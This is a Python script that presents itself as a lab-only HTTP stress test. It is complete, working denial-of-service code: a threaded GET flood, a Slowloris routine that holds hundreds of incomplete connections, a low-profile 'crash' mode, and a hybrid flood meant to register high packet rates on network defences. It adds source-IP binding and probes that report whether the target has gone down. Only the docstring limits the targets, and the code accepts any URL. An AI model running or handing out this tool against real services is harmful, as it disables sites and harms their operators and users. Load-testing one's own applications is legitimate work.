"""Aggressive HTTP stress test — for lab use on your own app only."""

from __future__ import annotations

import argparse
import concurrent.futures
import http.client
import socket
import sys
import threading
import time
import urllib.error
import urllib.request
from collections import Counter
from urllib.parse import urlparse


def _parse_target(url: str) -> tuple[str, int, str]:
    parsed = urlparse(url)
    host = parsed.hostname or '127.0.0.1'
    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
    path = parsed.path or '/'
    if parsed.query:
        path = f'{path}?{parsed.query}'
    return host, port, path


def _connect(host: str, port: int, bind: str | None = None, timeout: float = 2.0) -> socket.socket:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    s.settimeout(timeout)
    if bind:
        s.bind((bind, 0))
    s.connect((host, port))
    return s


def probe(url: str, timeout: float = 5.0, bind: str | None = None) -> tuple[bool, str, float]:
    t0 = time.time()
    host, port, path = _parse_target(url)
    try:
        if bind:
            conn = http.client.HTTPConnection(host, port, timeout=timeout, source_address=(bind, 0))
            conn.request('GET', path, headers={'Connection': 'close'})
            resp = conn.getresponse()
            resp.read()
            conn.close()
            return True, str(resp.status), time.time() - t0
        req = urllib.request.Request(url, headers={'Connection': 'close'})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            r.read()
            return True, str(r.status), time.time() - t0
    except Exception as e:
        return False, type(e).__name__, time.time() - t0


def flood_get(url: str, total: int, workers: int, bind: str | None = None) -> Counter:
    host, port, path = _parse_target(url)

    def hit(_):
        try:
            if bind:
                conn = http.client.HTTPConnection(host, port, timeout=4, source_address=(bind, 0))
                conn.request('GET', path, headers={'Connection': 'close'})
                resp = conn.getresponse()
                resp.read()
                conn.close()
                return 'ok'
            req = urllib.request.Request(url, headers={'Connection': 'close'})
            with urllib.request.urlopen(req, timeout=4) as r:
                r.read()
                return 'ok'
        except urllib.error.HTTPError as e:
            return f'http_{e.code}'
        except Exception as e:
            return type(e).__name__

    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        return Counter(ex.map(hit, range(total)))


def slowloris(host: str, port: int, sockets_count: int, hold_seconds: float, bind: str | None = None) -> int:
    """Hold many half-open HTTP connections (classic slowloris style)."""
    socks = []
    for i in range(sockets_count):
        try:
            s = _connect(host, port, bind=bind)
            s.sendall(f'GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: stress-{i}\r\n'.encode())
            socks.append(s)
        except OSError:
            pass
    time.sleep(hold_seconds)
    for s in socks:
        try:
            s.close()
        except OSError:
            pass
    return len(socks)


def _new_hold_sock(host: str, port: int, bind: str | None = None) -> socket.socket | None:
    try:
        s = _connect(host, port, bind=bind)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.sendall(b'GET / HTTP/1.1\r\nHost: 127.0.0.1\r\nAccept: */*\r\nX-Hold: ')
        return s
    except OSError:
        try:
            s.close()
        except Exception:
            pass
        return None


def crash_occupy(host: str, port: int, hold_seconds: float, target_socks: int = 3, bind: str | None = None) -> int:
    """Quiet Slowloris: a few incomplete HTTP sockets, then sit still."""
    socks: list[socket.socket] = []
    nkeep = max(1, min(int(target_socks), 3))
    deadline = time.time() + hold_seconds
    for _ in range(nkeep):
        s = _new_hold_sock(host, port, bind=bind)
        if s is not None:
            socks.append(s)
    while time.time() < deadline:
        time.sleep(0.4)
    for s in socks:
        try:
            s.close()
        except OSError:
            pass
    return len(socks)


def flood_until(url: str, hold_seconds: float, workers: int, per_burst: int, bind: str | None = None) -> Counter:
    """Completed GET storm in parallel with Slowloris so SDN sees high pps."""
    total = Counter()
    deadline = time.time() + hold_seconds
    while time.time() < deadline:
        total.update(flood_get(url, per_burst, workers, bind=bind))
    return total


def main():
    p = argparse.ArgumentParser(description='HTTP stress test (own apps only)')
    p.add_argument('--url', default='http://127.0.0.1:8765/')
    p.add_argument('--bind', default='', help='Source IP for outbound connections (e.g. 127.0.0.2)')
    p.add_argument('--rounds', type=int, default=5)
    p.add_argument('--per-round', type=int, default=3000)
    p.add_argument('--workers', type=int, default=250)
    p.add_argument('--slowloris', type=int, default=400)
    p.add_argument('--hold', type=float, default=8.0)
    p.add_argument('--crash', action='store_true', help='Occupy sockets forever (incomplete headers)')
    p.add_argument('--hybrid', action='store_true', help='Slowloris occupy + GET flood together')
    args = p.parse_args()

    bind = args.bind.strip() or None
    host, port, _ = _parse_target(args.url)

    print(f'Target: {args.url}')
    if bind:
        print(f'Source: {bind}')
    ok, status, lat = probe(args.url, bind=bind)
    print(f'BEFORE: ok={ok} status={status} latency={lat:.3f}s')

    if args.crash or args.hybrid:
        flood_counts = Counter()
        flood_thread = None
        if args.hybrid and not args.crash:
            flood_thread = threading.Thread(
                target=lambda: flood_counts.update(
                    flood_until(args.url, args.hold, max(args.workers, 80), max(args.per_round, 400), bind=bind)
                ),
                daemon=True,
            )
            flood_thread.start()
        nhold = 3 if args.crash else max(args.slowloris, 3)
        held = crash_occupy(host, port, args.hold, target_socks=nhold, bind=bind)
        if flood_thread:
            flood_thread.join(timeout=5)
        print(f'CRASH occupy sockets={held} for {args.hold}s flood={dict(flood_counts) or "off"}')
        ok2, status2, lat2 = probe(args.url, timeout=2, bind=bind)
        print(f'AFTER: ok={ok2} status={status2} latency={lat2:.3f}s')
        sys.exit(0 if ok2 else 2)

    total_errors = Counter()
    for rnd in range(1, args.rounds + 1):
        t0 = time.time()
        held = slowloris(host, port, args.slowloris, args.hold, bind=bind)
        c = flood_get(args.url, args.per_round, args.workers, bind=bind)
        total_errors.update(c)
        ok_mid, st_mid, _ = probe(args.url, timeout=2, bind=bind)
        print(f'Round {rnd}/{args.rounds}: {time.time()-t0:.1f}s slowloris={held} flood={dict(c)} mid_probe={ok_mid}/{st_mid}')
        if not ok_mid:
            print('TARGET UNREACHABLE — likely crashed or hung')
            break
        time.sleep(0.5)

    ok2, status2, lat2 = probe(args.url, timeout=8, bind=bind)
    print(f'AFTER: ok={ok2} status={status2} latency={lat2:.3f}s')
    print(f'TOTAL: {dict(total_errors)}')
    sys.exit(0 if ok2 else 2)


if __name__ == '__main__':
    main()
